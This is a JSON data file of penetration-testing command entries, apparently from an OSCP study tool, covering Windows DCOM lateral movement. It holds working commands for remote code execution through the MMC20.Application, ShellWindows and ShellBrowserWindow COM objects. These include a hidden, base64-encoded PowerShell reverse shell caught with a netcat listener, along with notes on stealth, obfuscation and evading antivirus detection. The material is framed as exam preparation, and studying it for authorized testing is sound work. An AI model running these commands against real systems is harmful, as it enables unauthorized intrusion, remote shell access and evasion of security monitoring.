{"commands": [{"id": "dcom-verify-rpc-port", "name": "DCOM - Verify RPC Port 135 Accessible", "description": "Test RPC port 135 accessibility for DCOM lateral movement using Test-NetConnection from PowerShell", "command": "Test-NetConnection <TARGET> -Port 135", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP address or hostname", "example": "192.168.50.73", "required": true}], "tags": ["oscp", "dcom", "rpc", "verification", "enumeration", "active-directory", "windows", "powershell", "oscp:medium"], "prerequisites": [], "alternatives": ["crackmapexec smb <TARGET> for general connectivity test"], "next_steps": ["If TcpTestSucceeded = True, proceed with dcom-mmc20-calc-poc for testing", "If False, DCOM lateral movement impossible - use alternative technique"], "flag_explanations": {"Test-NetConnection": "PowerShell cmdlet for testing network connectivity", "-Port 135": "RPC endpoint mapper port (required for DCOM communication)"}, "success_indicators": ["TcpTestSucceeded : True", "RemotePort      : 135", "Connection successful"], "failure_indicators": ["TcpTestSucceeded : False", "Connection timed out", "Network unreachable"], "troubleshooting": {"TcpTestSucceeded False": "Firewall blocking RPC - DCOM won't work. Verify with: sudo nmap -p 135 -Pn -v <TARGET>", "Connection timeout": "Port filtered or target unreachable. Check basic connectivity: ping <TARGET>", "Network unreachable": "Routing issue. Verify route: Test-NetConnection <TARGET> without -Port", "Port closed": "RPC service disabled (unlikely on Windows Server). Try alternative: WinRM (5985)"}, "notes": "EDUCATIONAL CONTEXT: DCOM (Distributed Component Object Model) requires RPC port 135 + dynamic high ports (49152-65535) for operation. WHY CHECK FIRST: Saves time - if port 135 blocked, DCOM lateral movement impossible. RPC ROLE: Port 135 is endpoint mapper that directs to dynamic ports for actual DCOM communication. DCOM vs WMI: Both use port 135 but different protocols - DCOM alternative when WMI blocked. FIREWALL REQUIREMENTS: Windows Firewall allows RPC by default on domain networks, often blocks on public/private. ALTERNATIVE CHECKS: From Kali use 'sudo nmap -p 135 -Pn -sV <TARGET>' for detailed service version detection. BEHIND THE SCENES: Test-NetConnection attempts TCP handshake to port 135, returns success/failure. TIME ESTIMATE: <10 seconds for connectivity test. EXAM TIP: Quick pre-check before attempting DCOM to avoid wasting time on blocked technique.", "oscp_relevance": "medium"}, {"id": "dcom-mmc20-calc-poc", "name": "DCOM - MMC20.Application Calculator PoC", "description": "Execute calculator on remote system via DCOM MMC20.Application (proof-of-concept test before deploying reverse shell)", "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<TARGET>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP address", "example": "192.168.50.73", "required": true}], "tags": ["oscp", "dcom", "mmc20", "lateral-movement", "active-directory", "windows", "powershell", "proof-of-concept", "oscp:high"], "prerequisites": ["Current user context has admin rights on target"], "alternatives": ["winrm-invoke-command if WinRM available", "dcom-shellwindows for alternative DCOM object"], "next_steps": ["Verify calc.exe running on target: Invoke-Command -ComputerName <TARGET> {tasklist | findstr calc}", "If successful, upgrade to dcom-mmc20-revshell for full shell access", "If fails, troubleshoot RPC connectivity or admin permissions"], "flag_explanations": {"[System.Activator]::CreateInstance": "Instantiate COM object remotely via DCOM", "GetTypeFromProgID": "Retrieve COM class by ProgID (MMC20.Application.1)", "\"MMC20.Application.1\"": "MMC DCOM class identifier", "Document.ActiveView.ExecuteShellCommand": "MMC method to execute shell commands remotely", "\"cmd\"": "Command interpreter to use", "$null": "Directory parameter (null = default working directory)", "\"/c calc\"": "Execute calculator then exit cmd.exe", "\"7\"": "WindowState (7 = minimized, 0 = hidden, 1 = normal)"}, "success_indicators": ["No PowerShell errors returned", "Calculator process appears on target (verify with tasklist)", "No Exception calling CreateInstance", "No RPC server unavailable errors"], "failure_indicators": ["Exception calling CreateInstance", "RPC server is unavailable", "Access is denied", "Retrieving the COM class factory failed"], "troubleshooting": {"RPC server unavailable": "Port 135 blocked. Verify with: Test-NetConnection <TARGET> -Port 135", "Access denied": "Need local admin rights on target. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>", "CreateInstance fails": "DCOM may be disabled or firewall blocking high ports. Check Windows Firewall on target", "Calculator not visible": "Expected behavior - process runs in Session 0 (system services). Verify with: Invoke-Command -ComputerName <TARGET> {Get-Process calc}", "COM class factory failed": "MMC20.Application not registered. Try alternative: dcom-shellwindows"}, "notes": "EDUCATIONAL CONTEXT: DCOM (Distributed Component Object Model) allows remote COM object instantiation over RPC - alternative to WMI when WMI blocked. WHY MMC20: Microsoft Management Console exposes ExecuteShellCommand method for remote script automation. DISCOVERY: Technique discovered by Matt Nelson (@enigma0x3) in 2017. HOW IT WORKS: 1) CreateInstance instantiates MMC20.Application on remote system via DCOM, 2) Access Document.ActiveView interface, 3) Call ExecuteShellCommand with cmd.exe and command arguments. SESSION 0 CAVEAT: Processes spawn in Session 0 (non-interactive system services) - GUI apps invisible to logged-in users. VERIFICATION: Use tasklist or Get-Process on target to confirm calc.exe running. REQUIREMENTS: RPC port 135 + ephemeral high ports (49152-65535), local admin access on target. BEHIND THE SCENES: Uses DCOM Service Control Manager API over RPC to instantiate COM objects. TIME ESTIMATE: 2-3 minutes for testing. EXAM TIP: Always test with harmless payload (calc) before deploying reverse shell to verify technique works.", "oscp_relevance": "high"}, {"id": "dcom-mmc20-revshell", "name": "DCOM - MMC20.Application Reverse Shell", "description": "Deploy base64-encoded PowerShell reverse shell via DCOM MMC20.Application for interactive remote access", "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<TARGET>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e <BASE64_PAYLOAD>\",\"7\")", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP address", "example": "192.168.50.73", "required": true}, {"name": "<BASE64_PAYLOAD>", "description": "Base64-encoded PowerShell reverse shell (use revshell-ps-generator)", "example": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...", "required": true}], "tags": ["oscp", "dcom", "mmc20", "reverse-shell", "lateral-movement", "active-directory", "windows", "powershell", "oscp:high"], "prerequisites": ["Base64 payload generated with revshell-ps-generator", "Netcat listener ready: nc -lvnp <LPORT> on Kali", "dcom-mmc20-calc-poc tested successfully"], "alternatives": ["wmi-powershell-revshell for WMI-based shell", "winrm-revshell-invoke for WinRM-based shell", "psexec-impacket-shell for direct SYSTEM shell"], "next_steps": ["Catch shell on Netcat listener: nc -lvnp <LPORT>", "Verify connection: whoami; hostname in caught shell", "Enumerate target: whoami /priv; systeminfo; Get-Process"], "flag_explanations": {"CreateInstance": "Instantiate remote COM object via DCOM", "MMC20.Application.1": "MMC DCOM class (ProgID)", "ExecuteShellCommand": "Method to execute shell commands remotely", "\"powershell\"": "Command interpreter (PowerShell instead of cmd)", "-nop": "No PowerShell profile (faster execution, stealthier)", "-w hidden": "Hidden window (no visible PowerShell console)", "-e <BASE64>": "Encoded command - executes base64-encoded payload", "\"7\"": "Minimized window state (invisible in Session 0 anyway)"}, "success_indicators": ["Netcat listener receives connection", "PowerShell prompt appears on Kali", "whoami shows target user context", "hostname confirms correct target"], "failure_indicators": ["Exception calling CreateInstance", "No connection received on listener", "RPC server unavailable", "PowerShell payload execution blocked"], "troubleshooting": {"No callback received": "Verify LHOST/LPORT in payload match listener. Decode payload: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))", "RPC unavailable": "Check firewall: Test-NetConnection <TARGET> -Port 135", "Payload execution blocked": "Antivirus may be blocking PowerShell. Try obfuscation or alternative technique", "Access denied": "Verify admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS> (look for Pwn3d!)", "Connection drops immediately": "Payload syntax error. Test payload locally first: powershell -nop -w hidden -e <BASE64>", "Firewall blocking callback": "Test outbound connectivity from target: Test-NetConnection <LHOST> -Port <LPORT>"}, "notes": "EDUCATIONAL CONTEXT: DCOM MMC20 exploitation combined with PowerShell reverse shell for full interactive remote access. WHY USE DCOM: Alternative when WMI/WinRM blocked by firewall or security tools - uses same port 135 but different protocol. PAYLOAD GENERATION: Use revshell-ps-generator to create base64-encoded PowerShell reverse shell with custom LHOST/LPORT. HOW IT WORKS: 1) DCOM instantiates MMC20 object, 2) ExecuteShellCommand spawns PowerShell, 3) PowerShell decodes and executes base64 payload, 4) Payload creates TCP connection back to LHOST:LPORT. COMPARISON: Similar stealth to WMI but different detection signatures - useful for evasion. SESSION 0: Shell runs in system service context (Session 0), not user desktop. STEALTH BENEFITS: Encoded payload reduces signature detection, no binary written to disk, no service creation (cleaner than PSExec). DISADVANTAGES: Requires compromised Windows host (can't execute from Kali like Impacket), more complex than PSExec. BEHIND THE SCENES: DCOM over RPC (port 135) → MMC COM object → PowerShell process → Base64 decode → Reverse shell. TIME ESTIMATE: 3-5 minutes including payload generation and listener setup. EXAM TIP: Pre-generate base64 payloads for common LHOST values before exam. Test DCOM with calculator first to verify technique works.", "oscp_relevance": "high"}, {"id": "dcom-shellwindows", "name": "DCOM - ShellWindows COM Object", "description": "Alternative DCOM lateral movement using ShellWindows COM object (CLSID 9BA05972-F6A8-11CF-A442-00A0C90A8F39)", "command": "$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\",\"<TARGET>\")); $item = $dcom.Item(); $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c <COMMAND>\",\"C:\\Windows\\System32\",$null,0)", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP address", "example": "192.168.50.73", "required": true}, {"name": "<COMMAND>", "description": "Command to execute remotely", "example": "calc", "required": true}], "tags": ["oscp", "dcom", "shellwindows", "lateral-movement", "active-directory", "windows", "powershell", "oscp:medium"], "prerequisites": ["DCOM enabled on target (default)"], "alternatives": ["dcom-mmc20-revshell (more reliable)", "dcom-shellbrowserwindow (similar technique)"], "next_steps": ["Verify command execution on target", "Use as alternative DCOM vector if MMC20 monitored", "Upgrade to full shell with PowerShell reverse shell payload"], "flag_explanations": {"GetTypeFromCLSID": "Access COM object by CLSID (not ProgID)", "9BA05972-F6A8-11CF-A442-00A0C90A8F39": "ShellWindows CLSID (Windows Explorer shell)", "Item()": "Get Explorer shell window instance", "ShellExecute": "Execute command via Windows shell", "0": "Window state (0 = hidden)", "C:\\Windows\\System32": "Working directory for command execution"}, "success_indicators": ["No PowerShell errors returned", "Command executes on target (verify with tasklist or file creation)", "No Exception calling CreateInstance"], "failure_indicators": ["Exception calling CreateInstance", "Object reference not set to an instance of an object", "Access is denied", "Unable to cast COM object"], "troubleshooting": {"Object reference not set": "ShellWindows may not have active Explorer instances on target. Try dcom-mmc20-revshell instead", "Access denied": "Need local admin rights. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>", "CreateInstance fails": "DCOM/RPC blocked by firewall or DCOM service disabled", "Unable to cast COM object": "Incompatibility with target Windows version. Use dcom-mmc20-revshell (more compatible)", "No active instances": "Target has no logged-in users with Explorer running. Use MMC20 technique instead"}, "notes": "EDUCATIONAL CONTEXT: ShellWindows is alternative DCOM technique for lateral movement - less reliable than MMC20 but useful for evasion. WHY USE THIS: Different DCOM vector if MMC20 monitored/blocked by security tools. RELIABILITY: Less reliable than MMC20 - depends on active Explorer shell instances (requires logged-in user). WHEN TO USE: When you need DCOM diversity for evasion, MMC20 blocked, or testing different vectors. BEHIND THE SCENES: Accesses Explorer shell COM object, uses ShellExecute method to run commands. LIMITATIONS: Requires user logged in with Explorer running (Session 0 services don't have ShellWindows instances). COMPARISON: MMC20 (always available, more reliable) vs ShellWindows (user-dependent, less reliable). TIME ESTIMATE: 2-3 minutes for testing. EXAM TIP: Stick with MMC20 for reliability unless specifically blocked - ShellWindows mainly for research/evasion.", "oscp_relevance": "medium"}, {"id": "dcom-shellbrowserwindow", "name": "DCOM - ShellBrowserWindow COM Object", "description": "DCOM lateral movement using ShellBrowserWindow COM object (CLSID C08AFD90-F2A1-11D1-8455-00A0C91F3880)", "command": "$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"<TARGET>\")); $dcom.Document.Application.ShellExecute(\"cmd.exe\",\"/c <COMMAND>\",\"C:\\Windows\\System32\",$null,0)", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP address", "example": "192.168.50.73", "required": true}, {"name": "<COMMAND>", "description": "Command to execute remotely", "example": "calc", "required": true}], "tags": ["oscp", "dcom", "shellbrowser", "lateral-movement", "active-directory", "windows", "powershell", "oscp:medium"], "prerequisites": ["DCOM enabled (default)"], "alternatives": ["dcom-mmc20-revshell (most reliable)", "dcom-shellwindows (similar technique)"], "next_steps": ["Test command execution on target", "Use for DCOM diversity in evasion scenarios", "Fallback to MMC20 if this method fails"], "flag_explanations": {"C08AFD90-F2A1-11D1-8455-00A0C91F3880": "ShellBrowserWindow CLSID", "Document.Application.ShellExecute": "Execute via shell application interface", "0": "Hidden window state"}, "success_indicators": ["No PowerShell exception", "Command executes on target system", "No CreateInstance errors"], "failure_indicators": ["Exception calling CreateInstance", "Object reference not set", "Access denied", "RPC server unavailable"], "troubleshooting": {"Object not set": "ShellBrowserWindow dependency - active browser window required. Use dcom-mmc20-revshell instead", "Access denied": "Admin rights required. Test: crackmapexec smb <TARGET> -u <USER> -p <PASS>", "CreateInstance fails": "DCOM disabled or firewall blocking. Check port 135: Test-NetConnection <TARGET> -Port 135", "No browser instances": "Target has no logged-in users with browser windows. Use MMC20 (always available)"}, "notes": "EDUCATIONAL CONTEXT: ShellBrowserWindow is third DCOM technique for lateral movement - similar limitations to ShellWindows. WHY EXISTS: Provides multiple DCOM vectors for evasion and diversity when one technique monitored. RELIABILITY: Low - depends on active browser window instances (requires logged-in user). WHEN TO USE: Research, evasion scenarios, or when MMC20/ShellWindows both blocked. COMPARISON: MMC20 (always works) > ShellWindows (Explorer dependency) ≈ ShellBrowserWindow (browser dependency). BEHIND THE SCENES: Accesses browser shell COM object, calls ShellExecute method. LIMITATIONS: Requires user logged in with browser window open - not reliable for automation. TIME ESTIMATE: 2-3 minutes for testing. EXAM TIP: Use MMC20 for OSCP - ShellBrowserWindow mainly for research/evasion. Focus on reliable techniques (MMC20, WMI, PSExec, WinRM) for exam efficiency.", "oscp_relevance": "medium"}]}